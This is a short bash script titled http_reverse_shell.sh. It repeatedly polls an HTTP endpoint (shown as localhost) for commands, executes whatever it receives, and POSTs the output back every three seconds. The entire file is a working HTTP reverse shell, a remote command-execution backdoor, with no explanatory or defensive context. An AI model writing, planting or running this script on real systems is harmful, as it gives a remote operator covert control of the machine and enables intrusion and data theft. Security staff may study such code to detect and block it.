#!/bin/bash
# http_reverse_shell.sh

while :;do c=$(curl -s localhost/http_reverse_shell/?ready=true);[ -n "$c" ]&&curl -X POST -s localhost/http_reverse_shell/ --data-urlencode "stdout=$($c)";sleep 3;done
